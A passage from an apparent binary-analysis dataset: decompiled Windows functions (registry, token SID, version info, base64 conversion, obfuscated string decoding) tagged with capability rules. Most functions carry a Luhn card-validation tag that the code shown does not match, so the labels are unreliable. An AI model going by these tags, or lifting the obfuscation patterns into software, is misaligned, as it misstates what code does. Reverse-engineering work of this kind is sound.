pcVar1 = _sym.imp.VERSION.dll_VerQueryValueW;\n            var_38h = 0x40cced;\n            var_34h = iVar3;\n            (*_sym.imp.VERSION.dll_VerQueryValueW)();\n            if (3 < var_8h) {\n                var_38h = 0x2d818d56;\n                var_3ch = 0x8;\n                lpdwHandle = 0x418cc8;\n                var_44h = 0x40cd08;\n                var_3ch = fcn.0040acd8();\n                var_38h = 0x8ae96841;\n                lpdwHandle = str.qMk_;\n                var_44h = 0x40cd1f;\n                var_38h = fcn.0040acd8();\n                var_3ch = 0xb;\n                lpdwHandle = 0x418ce4;\n                var_44h = 0x40cd36;\n                var_34h = fcn.0040acd8();\n                var_38h = 0x96249898;\n                var_3ch = 0xb;\n                lpdwHandle = 0x418cf0;\n                var_44h = 0x40cd4d;\n                var_30h = fcn.0040acd8();\n                var_38h = 0x43741fd3;\n                var_3ch = 0xe;\n                lpdwHandle = 0x418cfc;\n                var_44h = 0x40cd64;\n                var_2ch = fcn.0040acd8();\n                var_38h = 0x3e56a396;\n                var_3ch = 0xe;\n                lpdwHandle = 0x418d0c;\n                var_44h = 0x40cd7b;\n                var_28h = fcn.0040acd8();\n                var_38h = 0x4cba92d5;\n                var_3ch = 0xf;\n                lpdwHandle = 0x418d1c;\n                var_44h = 0x40cd92;\n                var_24h = fcn.0040acd8();\n                var_38h = 0xc9ab26c4;\n                var_3ch = 0xf;\n                lpdwHandle = 0x418d2c;\n                var_44h = 0x40cda9;\n                var_20h = fcn.0040acd8();\n                var_38h = 0x13d7db38;\n                var_3ch = 0xc;\n                lpdwHandle = 0x418d3c;\n                var_44h = 0x40cdc0;\n                var_1ch = fcn.0040acd8();\n                var_38h = 0xe3f14cc9;\n                var_3ch = 0xb;\n                lpdwHandle = str._twp;\n                var_44h = 0x40cdd7;\n                var_18h = fcn.0040acd8();\n                var_38h = 0x988deab6;\n                var_3ch = 0x10;\n                lpdwHandle = 0x418d58;\n                var_44h = 0x40cdee;\n                var_14h = fcn.0040acd8();\n                var_38h = 0x2e5782ec;\n                var_3ch = 0xc;\n                lpdwHandle = 0x418d6c;\n                var_44h = 0x40ce05;\n                var_10h = fcn.0040acd8();\n                var_38h = (&fcn.0040cc7b::var_3ch)[arg_ch];\n                var_44h = var_4h[1];\n                lpdwHandle = *var_4h;\n                uStackY80 = 0x1b;\n                uStackY84 = 0x418d7c;\n                uStackY88 = 0x40ce30;\n                var_3ch = var_44h;\n                var_44h = fcn.0040acd8();\n                uStackY80 = 0x40ce40;\n                fcn.0040be75(&fcn.0040cc7b::var_1450h, var_44h, lpdwHandle);\n                var_38h = &fcn.0040cc7b::var_44h;\n                var_3ch = &fcn.0040cc7b::var_ch;\n                lpdwHandle = &fcn.0040cc7b::var_1450h;\n                var_44h = iVar3;\n                iVar2 = (*pcVar1)();\n                if (iVar2 != 0) {\n                    var_38h = var_ch;\n                    var_3ch = 0x40ce63;\n                    uVar4 = fcn.0040bd22();\n                }\n            }\n            var_38h = 0x40ce6b;\n            fcn.0040af12();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 1777
    },
    "0040ce72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040ce72(uint param_1, uint param_2)\n\n{\n    int16_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        for (; (*in_EAX == 0x5c || (*in_EAX == 0x2f)); in_EAX = in_EAX + 1) {\n        }\n    }\n    iVar1 = (*_sym.imp.SHLWAPI.dll_PathCombineW)(param_1, param_2, in_EAX);\n    return iVar1 != 0;\n}\n",
        "token_count": 126
    },
    "0040d079": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040d079(uint Sid, uint lpDst)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_ch;\n    uint uVar3;\n    uint extraout_ECX;\n    bool bVar4;\n    uint lpSubKey;\n    uint lpSrc;\n    uint var_ch;\n    uint StringSid;\n    uint phkResult;\n    \n    cVar1 = fcn.0040f871(lpDst, 0x208);\n    if ((cVar1 == '\\0') || (cVar1 = fcn.0040f84a(Sid, 0xc),  cVar1 == '\\0')) {\n        bVar4 = false;\n    }\n    else {\n        bVar4 = false;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(Sid, &StringSid);\n        if (iVar2 != 0) {\n            uVar3 = StringSid;\n            arg_ch = fcn.0040acd8(0x418d98, 0x3b, 0xc4726ddc, extraout_ECX);\n            fcn.0040be75(&lpSubKey, arg_ch, uVar3);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, &lpSubKey, 0, 0x20119, &phkResult);\n            if (iVar2 == 0) {\n                var_ch = 0x208;\n                uVar3 = fcn.0040acd8(0x418dd4, 0x10, 0xc934b22f, 0, 0, &lpSrc, &var_ch);\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(phkResult, uVar3);\n                if (iVar2 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_PathUnquoteSpacesW)(&lpSrc);\n                    iVar2 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(&lpSrc, lpDst, 0x104);\n                    bVar4 = iVar2 - 1U < 0x104;\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            }\n            (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 525
    },
    "0040d302": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d302(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *arg_10h;\n    uint var_410h;\n    uint var_208h;\n    \n    uVar3 = 0;\n    cVar1 = fcn.0040f84a(arg_8h, 0xc);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040f898(arg_ch);\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.0040d274(&var_208h);\n            if (iVar2 != 0) {\n                iVar2 = fcn.0040d079(arg_8h, &var_410h);\n                if (iVar2 != 0) {\n                    arg_10h = &var_410h;\n                    uVar3 = fcn.0040acd8(0x418c10, 5, 0x27e55d8c, arg_10h, &var_208h);\n                    fcn.0040be75(arg_ch, uVar3, arg_10h);\n                    uVar3 = 1;\n                }\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 288
    },
    "0040d434": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040d434(uint *param_1)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    uint *puStack12;\n    int32_t iStack8;\n    \n    iStack8 = 0x40d440;\n    fcn.0040f898();\n    iStack8 = 4;\n    puStack12 = param_1;\n    cVar2 = fcn.0040f871();\n    if (cVar2 != '\\0') {\n        bVar6 = false;\n        puStack12 = NULL;\n        cVar2 = fcn.0040f871(param_1, 4);\n        if (cVar2 != '\\0') {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &stack0xfffffff4);\n            iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n            pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n            if (iVar4 != 0) {\n                iStack8 = 0;\n                (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(puStack12, 1, 0, 0, &stack0xfffffff8);\n                if (iStack8 != 0) {\n                    puVar5 = fcn.0040ae05(8);\n                    iVar4 = (*pcVar1)(puStack12, 1, puVar5, iStack8, &stack0xfffffff8);\n                    bVar6 = iVar4 != 0;\n                    if (bVar6) {\n                        uVar3 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(*puVar5);\n                        uVar3 = fcn.0040af95(*puVar5, uVar3);\n                        *param_1 = uVar3;\n                    }\n                    fcn.0040af12();\n                }\n            }\n        }\n        if (puStack12 != NULL) {\n            fcn.0040c13c();\n        }\n        return bVar6;\n    }\n    return false;\n}\n",
        "token_count": 477
    },
    "0040d55a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d5cc)\n\nint32_t __cdecl fcn.0040d55a(uint lpString)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_10h;\n    uint var_4h;\n    \n    arg_10h = 0;\n    cVar1 = fcn.0040f8bf(lpString);\n    if (((cVar1 != '\\0') &&\n        (((in_EAX != 0 || (in_EAX = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString),  in_EAX != 0)) &&\n         (iVar2 = fcn.0040d492(lpString, 0),  iVar2 != 0)))) && (arg_10h = fcn.0040ae05(0),  arg_10h != 0)) {\n        iVar2 = fcn.0040d509(lpString, in_EAX, arg_10h);\n        if (iVar2 == 0) {\n            fcn.0040af12();\n            arg_10h = 0;\n        }\n        else {\n            *(iVar2 + arg_10h) = 0;\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 282
    },
    "0040d5e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d5e4(uint lpString, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    cVar1 = fcn.0040f8eb(lpString);\n    if (cVar1 != '\\0') {\n        if (in_EAX == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            in_EAX = iVar2 + 1;\n        }\n        cVar1 = fcn.0040f871(arg_10h, in_EAX * 2);\n        if (cVar1 != '\\0') {\n            uVar3 = fcn.0040d4d1(0x4e3, lpString, in_EAX);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 208
    },
    "0040d63e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d6b7)\n\nint32_t __cdecl fcn.0040d63e(uint lpString)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_10h;\n    uint var_4h;\n    \n    arg_10h = 0;\n    cVar1 = fcn.0040f912(lpString);\n    if (((cVar1 != '\\0') &&\n        (((in_EAX != 0 || (in_EAX = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString),  in_EAX != 0)) &&\n         (iVar2 = fcn.0040d4d1(0x4e3, lpString, 0),  iVar2 != 0)))) && (arg_10h = fcn.0040ae05(0),  arg_10h != 0)) {\n        iVar2 = fcn.0040d5e4(lpString, in_EAX, arg_10h);\n        if (iVar2 == 0) {\n            fcn.0040af12();\n            arg_10h = 0;\n        }\n        else {\n            *(arg_10h + iVar2 * 2) = 0;\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 296
    },
    "0040d6d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d6d1(uint lpString, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    cVar1 = fcn.0040f912(lpString);\n    if ((cVar1 != '\\0') &&\n       (((arg_ch != 0 || (iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString),  iVar2 != 0)) &&\n        (iVar2 = fcn.0040d4d1(0xfde9, lpString, 0),  iVar2 != 0)))) {\n        var_4h = fcn.0040ae05(0);\n        if (var_4h != 0) {\n            cVar1 = fcn.0040f8eb(lpString);\n            if (((cVar1 == '\\0') || (cVar1 = fcn.0040f871(var_4h, iVar2 * 2),  cVar1 == '\\0')) ||\n               (iVar2 = fcn.0040d4d1(0xfde9, lpString, iVar2),  iVar2 == 0)) {\n                fcn.0040af12();\n                var_4h = 0;\n            }\n            else {\n                if (arg_10h != NULL) {\n                    *arg_10h = iVar2;\n                }\n                *(var_4h + iVar2 * 2) = 0;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 360
    },
    "0040daeb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040daeb(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    if (in_EAX != NULL) {\n        fcn.0040f6f5();\n        if ((*in_EAX == 0) || (iVar1 = fcn.00410f7c(*in_EAX, in_EAX + 9),  iVar1 == 0)) {\n            uVar2 = 1;\n        }\n        fcn.0040f763();\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 140
    },
    "0040db76": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040db76(void)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t *unaff_EDI;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t *var_4h;\n    \n    if (unaff_EDI != NULL) {\n        fcn.0040f6f5();\n        var_ch = 0;\n        var_8h = 0;\n        if (*unaff_EDI != 0) {\n            puVar2 = unaff_EDI + 9;\n            var_4h = puVar2;\n            do {\n                if (*puVar2 != 0) {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar2, 0);\n                    if (iVar1 == 0) {\n                        fcn.0040c13c();\n                        *puVar2 = 0;\n                    }\n                    else {\n                        var_ch = var_ch + 1;\n                        *var_4h = *puVar2;\n                        var_4h = var_4h + 1;\n                    }\n                }\n                var_8h = var_8h + 1;\n                puVar2 = puVar2 + 1;\n            } while (var_8h < *unaff_EDI);\n        }\n        *unaff_EDI = var_ch;\n        fcn.0040f763();\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "0040df2e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040df2e(uint *arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    uint arg_8h_01;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h = *0x41c6c8;\n    cVar1 = fcn.0040f871(arg_8h, 4);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040f871(0x41c6ac, 4),  cVar1 != '\\0')) {\n        var_24h = 0;\n        var_10h = fcn.004111b4();\n        var_14h = fcn.004111b4();\n        uVar2 = fcn.004111b4();\n        var_2ch = uVar2;\n        var_4h = fcn.004111b4();\n        var_8h = fcn.004111b4();\n        var_18h = fcn.004111b4();\n        var_1ch = fcn.004111b4();\n        var_20h = fcn.004111b4();\n        arg_8h_00 = fcn.004111b4();\n        var_30h = arg_8h_00;\n        arg_8h_01 = fcn.004111b4();\n        var_34h = arg_8h_01;\n        var_38h = fcn.004111b4();\n        var_ch = fcn.004111b4();\n        var_3ch = fcn.004111b4();\n        var_40h = fcn.004111b4();\n        var_44h = fcn.004111b4();\n        fcn.0040ddaa(uVar2, var_4h, var_8h, var_10h, var_14h, var_18h, var_1ch, var_20h, var_28h);\n        iVar3 = fcn.004137b1(0, 0);\n        fcn.0041171b(iVar3 + -1);\n        fcn.0041154c(arg_8h_00, var_4h, uVar2);\n        fcn.0041154c(arg_8h_01, var_8h, uVar2);\n        iVar3 = fcn.0041133c();\n        if (iVar3 == 0) {\n            puVar4 = fcn.0040ae05(8);\n            if (puVar4 != NULL) {\n                *puVar4 = 2;\n                uVar2 = fcn.004111b4();\n                puVar4[1] = uVar2;\n                fcn.0041137d();\n                uVar2 = fcn.004111b4();\n                puVar4[2] = uVar2;\n                fcn.0041137d();\n                uVar2 = fcn.004111b4();\n                puVar4[3] = uVar2;\n                fcn.0041137d();\n                *arg_8h = puVar4;\n            }\n            puVar4 = fcn.0040ae05(8);\n            if (puVar4 != NULL) {\n                *puVar4 = 1;\n                uVar2 = fcn.004111b4();\n                puVar4[1] = uVar2;\n                fcn.0041137d();\n                uVar2 = fcn.004111b4();\n                puVar4[2] = uVar2;\n                fcn.0041137d();\n                *0x41c6ac = puVar4;\n            }\n            var_24h = 1;\n        }\n        fcn.004111e1(&var_2ch);\n        fcn.004111e1(&var_4h);\n        fcn.004111e1(&var_8h);\n        fcn.004111e1(&var_10h);\n        fcn.004111e1(&var_14h);\n        fcn.004111e1(&var_18h);\n        fcn.004111e1(&var_1ch);\n        fcn.004111e1(&var_20h);\n        fcn.004111e1(&var_30h);\n        fcn.004111e1(&var_34h);\n        fcn.004111e1(&var_38h);\n        fcn.004111e1(&var_ch);\n        fcn.004111e1(&var_3ch);\n        fcn.004111e1(&var_40h);\n        fcn.004111e1(&var_44h);\n        return var_24h;\n    }\n    return 0;\n}\n",
        "token_count": 1170
    },
    "0040ef14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: pbBinary\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0040ef14(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    char *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint pszString;\n    uint var_34h;\n    uint pszSet;\n    uint pcbBinary;\n    uint var_28h;\n    uint var_24h;\n    uint pbBinary;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00415eec(0x4191c8, 0x74);\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -4) = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(extraout_ECX);\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    uVar2 = fcn.0040acc1(0x418e50, 4, 0xf95fd2b7);\n    *(unaff_EBP + -0x30) = uVar2;\n    *(unaff_EBP + -0x20) = *(unaff_EBP + 8);\n    pcVar5 = extraout_ECX;\n    while (*(unaff_EBP + -0x1c) != 0) {\n        if (*pcVar5 == '-') {\n            uVar2 = fcn.0040acc1(0x418e58, 2, 0x3b7e3c78);\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrPBrkA)(pcVar5, uVar2);\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 - pcVar5;\n            pcVar5 = pcVar5 + iVar3;\n            *(unaff_EBP + -0x24) = pcVar5;\n            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) - iVar3;\n        }\n        *(unaff_EBP + -0x80) = 0;\n        sub.ntdll.dll_memset(unaff_EBP + -0x7f, 0, 0x40);\n        for (uVar4 = 0; (*(unaff_EBP + -0x34) = uVar4,  *(unaff_EBP + -0x1c) != 0 && (uVar4 < 0x40)); uVar4 = uVar4 + 1)\n        {\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrSpnA)(pcVar5, *(unaff_EBP + -0x30));\n            pcVar5 = pcVar5 + iVar3;\n            *(unaff_EBP + -0x24) = pcVar5;\n            piVar1 = unaff_EBP + -0x1c;\n            *piVar1 = *piVar1 - iVar3;\n            if (*piVar1 == 0) break;\n            *(unaff_EBP + -0x80 + uVar4) = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n            *(unaff_EBP + -0x24) = pcVar5;\n            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -1;\n        }\n        if (uVar4 == 0) break;\n        *(unaff_EBP + -0x2c) = uVar4;\n        iVar3 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)\n                          (unaff_EBP + -0x80, uVar4, 1, *(unaff_EBP + -0x20), unaff_EBP + -0x2c, 0, 0);\n        if (iVar3 == 0) break;\n        *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + *(unaff_EBP + -0x2c);\n        if (*(unaff_EBP + -0x20) != 0) {\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + *(unaff_EBP + -0x2c);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 1075
    },
    "0040f0e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f0e7(int32_t pbBinary, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t pszString;\n    uint var_8h;\n    uint pcchString;\n    \n    iVar1 = *0x41c698;\n    pszString = 0;\n    if ((pbBinary != 0) && (*0x41c698 != 0)) {\n        pcchString = 0;\n        (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(pbBinary, *0x41c698, 1, 0, &pcchString);\n        pszString = fcn.0040ae05(0);\n        if (pszString != 0) {\n            iVar1 = fcn.0040f089(pbBinary, iVar1, pszString);\n            if (iVar1 == 0) {\n                fcn.0040af12();\n                pszString = 0;\n            }\n            else {\n                *(iVar1 + pszString) = 0;\n                if (arg_ch != NULL) {\n                    *arg_ch = iVar1;\n                }\n            }\n        }\n    }\n    return pszString;\n}\n",
        "token_count": 258
    },
    "0040f1cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040f1cc(uint lptstrFilename, uint s1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint lplpBuffer;\n    uint32_t puLen;\n    \n    uVar5 = 0;\n    uVar1 = (*_sym.imp.VERSION.dll_GetFileVersionInfoSizeA)(lptstrFilename, 0);\n    uVar2 = uVar1;\n    if (uVar1 != 0) {\n        uVar2 = fcn.0040ae05(0);\n        if (uVar2 != 0) {\n            iVar3 = (*_sym.imp.VERSION.dll_GetFileVersionInfoA)(lptstrFilename, 0, uVar1, uVar2);\n            if (iVar3 != 0) {\n                uVar4 = fcn.0040a88f(0x418e6c, 1, 0x706e1943, 0);\n                iVar3 = (*_sym.imp.VERSION.dll_VerQueryValueA)(uVar2, uVar4, &lplpBuffer, &puLen);\n                if (iVar3 != 0) {\n                    if (0x34 < puLen) {\n                        puLen = 0x34;\n                    }\n                    sub.ntdll.dll_memcpy(s1, lplpBuffer, puLen);\n                    uVar5 = 1;\n                }\n            }\n            uVar2 = fcn.0040af12();\n        }\n    }\n    return uVar2 & 0xffffff00 | uVar5;\n}\n",
        "token_count": 360
    },
    "0040f347": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f347(void)\n\n{\n    uint arg_8h;\n    int32_t iVar1;\n    \n    iVar1 = *0x41d8d8;\n    if (*0x41d8d8 == 0) {\n        arg_8h = fcn.0040f2d5();\n        iVar1 = fcn.0040f2dd(arg_8h);\n    }\n    return *(iVar1 + *(iVar1 + 0x3c) + 0x50);\n}\n",
        "token_count": 113
    },
    "0040f3e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040f3e6(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    bool bVar3;\n    \n    bVar3 = false;\n    cVar1 = fcn.0040f898(arg_8h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040f84a(arg_ch, 0xc);\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.00411a47(arg_8h, arg_ch);\n            cVar2 = fcn.00411f31(arg_8h, arg_ch);\n            bVar3 = (cVar2 != '\\0') + (cVar1 != '\\0') != '\\0';\n        }\n    }\n    return bVar3;\n}\n",
        "token_count": 186
    },
    "0040f47b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040f47b(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_ch;\n    bool bVar3;\n    uint var_228h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint uStack24;\n    int32_t var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_1h;\n    \n    bVar3 = false;\n    cVar1 = fcn.0040f898(0x41dc10);\n    if (cVar1 != '\\0') {\n        var_10h = 0;\n        uStack12 = 0;\n        var_ch = 0x41dc10;\n        fcn.0040d241(&var_10h);\n        var_1h._0_1_ = '\\0';\n        iVar2 = (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 7, 0xffffffff, 1, &var_228h);\n        if (iVar2 == 0) {\n            var_1h._0_1_ = fcn.00411a7f(0x41dc10, &var_228h);\n        }\n        var_1ch = 0;\n        var_10h = var_10h + (var_1h != '\\0');\n        uStack24 = 0;\n        var_18h = 0x41dc10;\n        fcn.0040d241(&var_1ch);\n        arg_ch = fcn.0040acd8(0x418f8c, 8, 0x30849cef);\n        cVar1 = fcn.00411f66(0x41dc10, arg_ch);\n        bVar3 = (var_1ch + (cVar1 != '\\0') != 0) + (var_10h != 0) != '\\0';\n    }\n    return bVar3;\n}\n",
        "token_count": 453
    },
    "0040f763": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040f763(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint dwErrCode;\n    uint var_4h;\n    \n    fcn.00415eec(0x4190e0, 0xc);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -4) = 0;\n    cVar1 = fcn.0040f871(extraout_ECX, 0x20);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040f670(extraout_ECX);\n        if (cVar1 != '\\0') {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (*(extraout_ECX + 4) == iVar3) {\n                *(extraout_ECX + 4) = 0;\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(extraout_ECX + 8);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(*(unaff_EBP + -0x1c));\n    fcn.00415f27();\n    return;\n}\n",
        "token_count": 332
    },
    "0041043c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0041043c(char param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    uint8_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    if (param_1 < 'j') {\n        if (param_1 != 'i') {\n            if (param_1 == 'C') {\n                if (param_2 == '\\0') {\n                    uVar1 = *(in_EAX + 1) & 0x10;\ncode_r0x00410489:\n                    bVar3 = uVar1 != 0;\n                }\n                else {\n                    uVar1 = *(in_EAX + 1) & 0x10;\ncode_r0x004104e1:\n                    bVar3 = uVar1 == 0;\n                }\n                iVar2 = bVar3 + 1;\ncode_r0x0041048d:\n                *in_EAX = iVar2;\n                goto code_r0x0041052d;\n            }\n            if (param_1 == 'P') {\n                in_EAX[1] = in_EAX[1] | 0x20;\n                goto code_r0x004104ba;\n            }\n            if (param_1 == 'S') {\n                if (param_2 != '\\0') {\n                    uVar1 = in_EAX[1] & 0x50;\n                    goto code_r0x004104aa;\n                }\n                uVar1 = *(in_EAX + 1) & 0x50;\ncode_r0x00410519:\n                iVar2 = (uVar1 != 0) + 3;\n                goto code_r0x0041048d;\n            }\n            if (param_1 == 'X') {\n                in_EAX[1] = in_EAX[1] | 0x20;\n                goto code_r0x004104c8;\n            }\n            if (param_1 == 'c') {\n                if (param_2 != '\\0') {\n                    uVar1 = *(in_EAX + 1) & 8;\n                    goto code_r0x00410489;\n                }\n                uVar1 = *(in_EAX + 1) & 8;\n                goto code_r0x004104e1;\n            }\n            if (param_1 != 'd') goto code_r0x004104fc;\n        }\n        *in_EAX = 5;\n    }\n    else {\n        if (param_1 == 'o') {\n            *in_EAX = 8;\n            goto code_r0x0041052d;\n        }\n        if (param_1 == 'p') {\ncode_r0x004104ba:\n            in_EAX[1] = in_EAX[1] | 0x804;\n            in_EAX[2] = 8;\n        }\n        else {\n            if (param_1 == 's') {\n                if (param_2 != '\\0') {\n                    uVar1 = *(in_EAX + 1) & 0x48;\n                    goto code_r0x00410519;\n                }\n                uVar1 = in_EAX[1] & 